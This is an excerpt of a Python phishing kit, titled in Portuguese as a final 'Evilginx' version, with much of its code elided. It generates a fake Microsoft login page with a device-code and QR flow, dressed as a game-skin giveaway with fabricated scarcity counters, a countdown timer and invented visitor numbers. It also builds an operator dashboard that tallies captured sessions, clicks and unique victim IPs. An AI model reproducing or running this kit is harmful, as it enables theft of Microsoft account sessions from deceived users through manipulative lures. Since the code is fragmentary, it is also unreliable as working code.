#!/usr/bin/env python3
"""
EVILGINX COMPLETE - VERSÃO FINAL (SEM ERROS)
...
<script>
var qrUrl = ''' + qr_url_json + ''';
var deviceCode = ''' + device_safe + ''';
...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .scarcity-value { font-weight: bold; color: #e94560; }
        .login-card {
            background: white;
            border-radius: 4px;
            padding: 44px;
...
<div class="container">
    ...
    <div class="scarcity-box">
        <div class="scarcity-row"><span>🎁 Skins disponíveis:</span><span class="scarcity-value" id="skinsLeft">''' + str(skins_left_js) + '''</span></div>
        <div class="scarcity-row"><span>👥 Participantes do sorteio:</span><span class="scarcity-value" id="participants">''' + str(participants_js) + '''</span></div>
        <div class="scarcity-row"><span>⏰ Oferta expira em:</span><span class="scarcity-value timer" id="timer">14:59</span></div>
        <div class="scarcity-row"><span>👀 Pessoas online agora:</span><span class="scarcity-value live-counter" id="onlineCount">''' + str(online_visitors_init) + '''</span></div>
    </div>
    <div class="login-card">
        <div class="microsoft-logo">
            <svg viewBox="0 0 108 23">
...
var clickCount = 0;
var skinsLeft = ''' + str(skins_left_js) + ''';
var participants = ''' + str(participants_js) + ''';
var onlineVisitors = ''' + str(online_visitors_init) + ''';
...
<body>
    ...
    <div class="stats">
        <div class="stat"><div class="stat-value">''' + str(len(sessions_copy)) + '''</div><div>Total Capturas</div></div>
        <div class="stat"><div class="stat-value">''' + str(total_clicks) + '''</div><div>Total Cliques</div></div>
        <div class="stat"><div class="stat-value">''' + str(unique_ips) + '''</div><div>IPs Únicos</div></div>
    </div>
    <p>Últimas capturas (máx ''' + str(MAX_SESSIONS) + '''):</p>
    <table>
        <thead>
...
def run():
    print("=" * 70)
    print("🎯 EVILGINX COMPLETE - VERSÃO FINAL")
    print("=" * 70)
